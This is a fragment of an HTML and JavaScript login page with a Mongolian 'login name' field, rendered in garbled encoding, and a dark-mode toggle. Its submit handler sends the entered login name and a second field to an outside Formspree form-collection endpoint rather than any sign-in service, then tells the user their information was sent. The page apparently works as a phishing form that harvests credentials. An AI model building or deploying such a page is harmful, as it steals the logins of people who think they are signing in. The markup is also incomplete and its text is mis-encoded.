  <!-- Formulaire -->
  <form id="loginForm">
    <div class="input-group">
      <span class="icon">üë§</span>
      <input type="text" id="text1" name="text1" placeholder="–ù—ç–≤—Ç—Ä—ç—Ö –Ω—ç—Ä" required>

  <!-- Message de retour -->
  <p id="formMessage" style="margin-top: 15px; font-weight: bold;"></p>

  <div class="background-symbol">‚òØ</div>

  <script>
    // Mode sombre
    const darkModeToggle = document.getElementById('darkModeToggle');
    const body = document.body;
    const isDarkMode = localStorage.getItem('darkMode') === 'true';
    if (isDarkMode) body.classList.add('dark-mode');
    darkModeToggle.addEventListener('click', () => {
      body.classList.toggle('dark-mode');
      localStorage.setItem('darkMode', body.classList.contains('dark-mode'));
    });

    // Bouton couleur selon inputs
    const submitBtn = document.getElementById('submitBtn');
    const text1Input = document.getElementById('text1');
    const text2Input = document.getElementById('text2');
    const messageEl = document.getElementById('formMessage');
    const defaultBtnColor = '#d0d2e2';
    const activeBtnColor = '#C19A4B';

    function checkInputs() {
      if (text1Input.value.trim() && text2Input.value.trim()) {
        submitBtn.style.backgroundColor = activeBtnColor;
        submitBtn.disabled = false;
      } else {
        submitBtn.style.backgroundColor = defaultBtnColor;
        submitBtn.disabled = true;
      }
    }

    text1Input.addEventListener('input', checkInputs);
    text2Input.addEventListener('input', checkInputs);
    checkInputs();

    // Envoi AJAX via Formspree
    document.getElementById('loginForm').addEventListener('submit', async function(event) {
      event.preventDefault();

      const data = {
        text1: text1Input.value.trim(),
        text2: text2Input.value.trim()
      };

      try {
        const response = await fetch('https://formspree.io/f/meeejgqq', { // ‚ö†Ô∏è Mets ton endpoint Formspree ici
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          messageEl.textContent = "‚úÖ –¢–∞–Ω—ã –º—ç–¥—ç—ç–ª—ç–ª –∞–º–∂–∏–ª—Ç—Ç–∞–π –∏–ª–≥—ç—ç–≥–¥–ª—ç—ç.";
          messageEl.style.color = "green";
          text1Input.value = "";
          text2Input.value = "";
        } else {
          const result = await response.json();
          messageEl.textContent = "‚ùå –ò–ª–≥—ç—ç—Ö—ç–¥ –∞–ª–¥–∞–∞ –≥–∞—Ä–ª–∞–∞: " + (result.message || '–î–∞—Ö–∏–Ω –æ—Ä–æ–ª–¥–æ–Ω–æ —É—É.');
          messageEl.style.color = "red";
        }
      } catch (error) {
        messageEl.textContent = "‚ùå –ò–ª–≥—ç—ç—Ö—ç–¥ –∞–ª–¥–∞–∞ –≥–∞—Ä–ª–∞–∞. –î–∞—Ö–∏–Ω –æ—Ä–æ–ª–¥–æ–Ω–æ —É—É.";
        messageEl.style.color = "red";
        console.error(error);
      }
    });
  </script>
